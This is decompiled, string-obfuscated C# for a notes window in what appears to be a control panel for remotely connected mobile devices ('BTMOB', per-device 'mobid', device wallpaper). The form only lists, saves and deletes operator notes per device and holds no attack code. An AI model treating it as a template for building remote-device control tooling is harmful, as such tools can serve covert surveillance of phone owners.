using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;

namespace BTMOB;

[DesignerGenerated]
public class btNotes : basestyle
{
	[CompilerGenerated]
	internal sealed class _Closure_0024__34_002D0
	{
		public List<string> _0024VB_0024Local_allnotes;

		public btNotes _0024VB_0024Me;

		public _Closure_0024__34_002D0(_Closure_0024__34_002D0 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_allnotes = arg0._0024VB_0024Local_allnotes;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__0()
		{
			_0024VB_0024Me.notecount.Text = $"{_0024VB_0024Local_allnotes.Count} {BTConst.NotesStr}";
			_0024VB_0024Me.viewpanel.Controls.Clear();
			_Closure_0024__34_002D1 closure_0024__34_002D = default(_Closure_0024__34_002D1);
			foreach (string item in _0024VB_0024Local_allnotes)
			{
				closure_0024__34_002D = new _Closure_0024__34_002D1(closure_0024__34_002D);
				closure_0024__34_002D._0024VB_0024NonLocal__0024VB_0024Closure_2 = this;
				closure_0024__34_002D._0024VB_0024Local_noteLabel = new Label();
				closure_0024__34_002D._0024VB_0024Local_noteLabel.Text = item;
				closure_0024__34_002D._0024VB_0024Local_noteLabel.AutoSize = false;
				closure_0024__34_002D._0024VB_0024Local_noteLabel.Dock = DockStyle.Top;
				closure_0024__34_002D._0024VB_0024Local_noteLabel.Height = 35;
				closure_0024__34_002D._0024VB_0024Local_noteLabel.TextAlign = ContentAlignment.MiddleLeft;
				closure_0024__34_002D._0024VB_0024Local_noteLabel.Padding = new Padding(5);
				closure_0024__34_002D._0024VB_0024Local_noteLabel.BackColor = Color.FromArgb(14, 22, 33);
				closure_0024__34_002D._0024VB_0024Local_noteLabel.ForeColor = Color.White;
				closure_0024__34_002D._0024VB_0024Local_noteLabel.BorderStyle = BorderStyle.FixedSingle;
				closure_0024__34_002D._0024VB_0024Local_noteLabel.Tag = 0;
				closure_0024__34_002D._0024VB_0024Local_noteLabel.Click += closure_0024__34_002D._Lambda_0024__1;
				_0024VB_0024Me.viewpanel.Controls.Add(closure_0024__34_002D._0024VB_0024Local_noteLabel);
			}
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__34_002D1
	{
		public Label _0024VB_0024Local_noteLabel;

		public _Closure_0024__34_002D0 _0024VB_0024NonLocal__0024VB_0024Closure_2;

		public _Closure_0024__34_002D1(_Closure_0024__34_002D1 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_noteLabel = arg0._0024VB_0024Local_noteLabel;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__1(object sndr, EventArgs evnt)
		{
			foreach (Control control in _0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.viewpanel.Controls)
			{
				if (control is Label)
				{
					control.ForeColor = Color.White;
					control.Tag = 0;
				}
			}
			_0024VB_0024Local_noteLabel.ForeColor = Color.FromArgb(2, 176, 117);
			_0024VB_0024Local_noteLabel.Tag = 1;
		}
	}

	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("loadworker")]
	private BackgroundWorker _loadworker;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("sndbtn")]
	private DrakeUIButtonIcon _sndbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("removebtn")]
	private DrakeUIButtonIcon _removebtn;

	public BTClient Tclient;

	[field: AccessedThroughProperty("Panel5")]
	internal virtual Panel Panel5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("notecount")]
	internal virtual Label notecount
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W2")]
	internal new virtual DrakeWidth_W DrakeWidth_W2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual BackgroundWorker loadworker
	{
		[CompilerGenerated]
		get
		{
			return _loadworker;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DoWorkEventHandler value2 = loadworker_DoWork;
			BackgroundWorker backgroundWorker = _loadworker;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork -= value2;
			}
			_loadworker = value;
			backgroundWorker = _loadworker;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork += value2;
			}
		}
	}

	[field: AccessedThroughProperty("viewpanel")]
	internal virtual Panel viewpanel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon sndbtn
	{
		[CompilerGenerated]
		get
		{
			return _sndbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = sndbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _sndbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_sndbtn = value;
			drakeUIButtonIcon = _sndbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon removebtn
	{
		[CompilerGenerated]
		get
		{
			return _removebtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon1_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _removebtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_removebtn = value;
			drakeUIButtonIcon = _removebtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	public btNotes()
	{
		base.Load += btNotes_Load;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(BTMOB.btNotes));
		this.Panel5 = new System.Windows.Forms.Panel();
		this.notecount = new System.Windows.Forms.Label();
		this.removebtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeWidth_W2 = new DrakeUI.Framework.DrakeWidth_W();
		this.sndbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.loadworker = new System.ComponentModel.BackgroundWorker();
		this.viewpanel = new System.Windows.Forms.Panel();
		((System.ComponentModel.ISupportInitialize)this.myscr).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.myico).BeginInit();
		this.tobpanelsti.SuspendLayout();
		this.Panel5.SuspendLayout();
		base.SuspendLayout();
		this.myscr.Visible = false;
		this.pinbtn.Location = new System.Drawing.Point(581, 5);
		this.minibtn.Location = new System.Drawing.Point(623, 5);
		this.closbtn.Location = new System.Drawing.Point(665, 5);
		this.mytitle.Location = new System.Drawing.Point(5, 4);
		this.mytitle.Size = new System.Drawing.Size(697, 18);
		this.mytitle.Visible = false;
		this.tobpanelsti.Padding = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.tobpanelsti.Size = new System.Drawing.Size(707, 26);
		this.Panel5.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel5.Controls.Add(this.notecount);
		this.Panel5.Controls.Add(this.removebtn);
		this.Panel5.Controls.Add(this.DrakeWidth_W2);
		this.Panel5.Controls.Add(this.sndbtn);
		this.Panel5.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.Panel5.Location = new System.Drawing.Point(2, 347);
		this.Panel5.Name = EXGuarder._2F454200;
		this.Panel5.Padding = new System.Windows.Forms.Padding(10, 9, 10, 9);
		this.Panel5.Size = new System.Drawing.Size(707, 56);
		this.Panel5.TabIndex = 40;
		this.notecount.Dock = System.Windows.Forms.DockStyle.Fill;
		this.notecount.Font = new System.Drawing.Font(EXGuarder._63397702, 8f);
		this.notecount.Location = new System.Drawing.Point(10, 9);
		this.notecount.Name = EXGuarder._40571F46;
		this.notecount.Size = new System.Drawing.Size(418, 38);
		this.notecount.TabIndex = 0;
		this.notecount.Text = EXGuarder._5B325573;
		this.removebtn.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.removebtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.removebtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.removebtn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.removebtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.removebtn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.removebtn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.removebtn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.removebtn.Font = new System.Drawing.Font(EXGuarder._63397702, 10f);
		this.removebtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.removebtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.removebtn.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.removebtn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.removebtn.Location = new System.Drawing.Point(428, 9);
		this.removebtn.Name = EXGuarder._23613853;
		this.removebtn.Radius = 15;
		this.removebtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.removebtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.removebtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.removebtn.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.removebtn.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.removebtn.Size = new System.Drawing.Size(122, 38);
		this.removebtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.removebtn.Symbol = 61453;
		this.removebtn.SymbolSize = 20;
		this.removebtn.TabIndex = 43;
		this.removebtn.Text = EXGuarder._67774127;
		this.DrakeWidth_W2.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W2.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeWidth_W2.Location = new System.Drawing.Point(550, 9);
		this.DrakeWidth_W2.Name = EXGuarder._696F513A;
		this.DrakeWidth_W2.Size = new System.Drawing.Size(25, 38);
		this.DrakeWidth_W2.TabIndex = 22;
		this.sndbtn.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.sndbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.sndbtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.sndbtn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.sndbtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.sndbtn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.sndbtn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.sndbtn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.sndbtn.Font = new System.Drawing.Font(EXGuarder._63397702, 10f);
		this.sndbtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.sndbtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.sndbtn.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.sndbtn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.sndbtn.Location = new System.Drawing.Point(575, 9);
		this.sndbtn.Name = EXGuarder._4F18673D;
		this.sndbtn.Radius = 15;
		this.sndbtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.sndbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.sndbtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.sndbtn.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.sndbtn.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.sndbtn.Size = new System.Drawing.Size(122, 38);
		this.sndbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.sndbtn.Symbol = 61543;
		this.sndbtn.SymbolSize = 20;
		this.sndbtn.TabIndex = 42;
		this.sndbtn.Text = EXGuarder._416D3878;
		this.viewpanel.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.viewpanel.Dock = System.Windows.Forms.DockStyle.Fill;
		this.viewpanel.Location = new System.Drawing.Point(2, 64);
		this.viewpanel.Name = EXGuarder._673C233C;
		this.viewpanel.Padding = new System.Windows.Forms.Padding(9, 9, 9, 9);
		this.viewpanel.Size = new System.Drawing.Size(707, 283);
		this.viewpanel.TabIndex = 41;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 18f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(711, 405);
		base.Controls.Add(this.viewpanel);
		base.Controls.Add(this.Panel5);
		base.Icon = (System.Drawing.Icon)resources.GetObject(EXGuarder._451E4F07);
		base.Name = EXGuarder._02366F32;
		this.Text = EXGuarder._02366F32;
		base.Controls.SetChildIndex(this.tobpanelsti, 0);
		base.Controls.SetChildIndex(this.Panel5, 0);
		base.Controls.SetChildIndex(this.viewpanel, 0);
		((System.ComponentModel.ISupportInitialize)this.myscr).EndInit();
		((System.ComponentModel.ISupportInitialize)this.myico).EndInit();
		this.tobpanelsti.ResumeLayout(false);
		this.Panel5.ResumeLayout(false);
		base.ResumeLayout(false);
	}

	private void btNotes_Load(object sender, EventArgs e)
	{
		myico.Image = Tclient.wallpaper;
		loadworker.RunWorkerAsync();
	}

	private void loadworker_DoWork(object sender, DoWorkEventArgs e)
	{
		try
		{
			_Closure_0024__34_002D0 arg = default(_Closure_0024__34_002D0);
			_Closure_0024__34_002D0 CS_0024_003C_003E8__locals9 = new _Closure_0024__34_002D0(arg);
			CS_0024_003C_003E8__locals9._0024VB_0024Me = this;
			CS_0024_003C_003E8__locals9._0024VB_0024Local_allnotes = NotesManager.LoadNotes(Tclient.mobid);
			if (CS_0024_003C_003E8__locals9._0024VB_0024Local_allnotes.Count > 0)
			{
				Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
				{
					CS_0024_003C_003E8__locals9._0024VB_0024Me.notecount.Text = $"{CS_0024_003C_003E8__locals9._0024VB_0024Local_allnotes.Count} {BTConst.NotesStr}";
					CS_0024_003C_003E8__locals9._0024VB_0024Me.viewpanel.Controls.Clear();
					_Closure_0024__34_002D1 closure_0024__34_002D = default(_Closure_0024__34_002D1);
					foreach (string item in CS_0024_003C_003E8__locals9._0024VB_0024Local_allnotes)
					{
						closure_0024__34_002D = new _Closure_0024__34_002D1(closure_0024__34_002D);
						closure_0024__34_002D._0024VB_0024NonLocal__0024VB_0024Closure_2 = CS_0024_003C_003E8__locals9;
						closure_0024__34_002D._0024VB_0024Local_noteLabel = new Label();
						closure_0024__34_002D._0024VB_0024Local_noteLabel.Text = item;
						closure_0024__34_002D._0024VB_0024Local_noteLabel.AutoSize = false;
						closure_0024__34_002D._0024VB_0024Local_noteLabel.Dock = DockStyle.Top;
						closure_0024__34_002D._0024VB_0024Local_noteLabel.Height = 35;
						closure_0024__34_002D._0024VB_0024Local_noteLabel.TextAlign = ContentAlignment.MiddleLeft;
						closure_0024__34_002D._0024VB_0024Local_noteLabel.Padding = new Padding(5);
						closure_0024__34_002D._0024VB_0024Local_noteLabel.BackColor = Color.FromArgb(14, 22, 33);
						closure_0024__34_002D._0024VB_0024Local_noteLabel.ForeColor = Color.White;
						closure_0024__34_002D._0024VB_0024Local_noteLabel.BorderStyle = BorderStyle.FixedSingle;
						closure_0024__34_002D._0024VB_0024Local_noteLabel.Tag = 0;
						closure_0024__34_002D._0024VB_0024Local_noteLabel.Click += closure_0024__34_002D._Lambda_0024__1;
						CS_0024_003C_003E8__locals9._0024VB_0024Me.viewpanel.Controls.Add(closure_0024__34_002D._0024VB_0024Local_noteLabel);
					}
				}));
			}
			else
			{
				Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
				{
					viewpanel.Controls.Clear();
					notecount.Text = string.Format(EXGuarder._21040F13, BTConst.NotesStr);
				}));
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			BTAlerter.erroes(ex2.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void sndbtn_Click(object sender, EventArgs e)
	{
		myinputs myinputs2 = new myinputs();
		myinputs2.msgtitle.Text = EXGuarder._3C0A1556;
		myinputs2.inputtext.Text = EXGuarder._491F7469;
		myinputs2.inputtext2.Visible = false;
		myinputs2.checkfolder.Visible = false;
		myinputs2.inputtext.Watermark = EXGuarder._16245E6D;
		if (myinputs2.ShowDialog() == DialogResult.OK)
		{
			string noteText = myinputs2.inputtext.Text;
			NotesManager.SaveNote(Tclient.mobid, noteText);
			BTAlerter.Success(EXGuarder._3C425C37);
			loadworker.RunWorkerAsync();
		}
	}

	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
		if (viewpanel.Controls.Count == 0)
		{
			BTAlerter.infos(EXGuarder._6041510D);
			return;
		}
		Label label = null;
		foreach (Control control in viewpanel.Controls)
		{
			if (control is Label && Operators.ConditionalCompareObjectEqual(control.Tag, 1, TextCompare: false))
			{
				label = (Label)control;
				break;
			}
		}
		if (label != null)
		{
			string noteText = label.Text;
			NotesManager.RemoteNote(Tclient.mobid, noteText);
			loadworker.RunWorkerAsync();
		}
		else
		{
			BTAlerter.Warnings(EXGuarder._5B32356D);
		}
	}
}
